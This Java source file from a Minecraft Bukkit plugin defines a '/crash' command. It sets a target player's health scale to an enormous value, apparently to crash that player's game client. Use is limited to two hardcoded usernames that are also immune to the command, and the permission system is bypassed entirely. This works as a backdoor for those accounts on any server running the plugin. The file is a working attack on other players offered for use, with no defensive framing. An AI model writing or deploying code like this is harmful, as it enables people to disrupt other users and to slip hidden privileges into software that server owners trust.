package Otaku.Comandos;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;

public class CrashPlayer
  implements CommandExecutor, Listener
{
  public CrashPlayer(Otaku.Main main) {}
  
  public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
  {
    Player p = (Player)sender;
    if (cmd.getName().equalsIgnoreCase("crash")) {
      if ((p.getName().equalsIgnoreCase("BarraBan")) || (p.getName().equalsIgnoreCase("FopysX1P")))
      {
        if (args.length == 0)
        {
          p.sendMessage("§cUse: /crash [Jogador]");
        }
        else if (args.length == 1)
        {
          Player target = p.getServer().getPlayer(args[0]);
          if (target != null) {
            if ((target.getName().equalsIgnoreCase("BarraBan")) || (target.getName().equalsIgnoreCase("FopysX1P")))
            {
              p.sendMessage(ChatColor.GRAY + "2");
            }
            else if (target.getGameMode().equals(GameMode.CREATIVE))
            {
              target.setGameMode(GameMode.SURVIVAL);
              p.sendMessage(ChatColor.GRAY + "1");
              target.setHealthScale(9.49592994E8D);
            }
            else
            {
              p.sendMessage(ChatColor.RED + "Crashado");
              target.setHealthScale(9.49592994E8D);
            }
          }
        }
      }
      else {
        p.sendMessage(ChatColor.RED + "Voce nao esta listado para usar esse comando!");
      }
    }
    return false;
  }
}
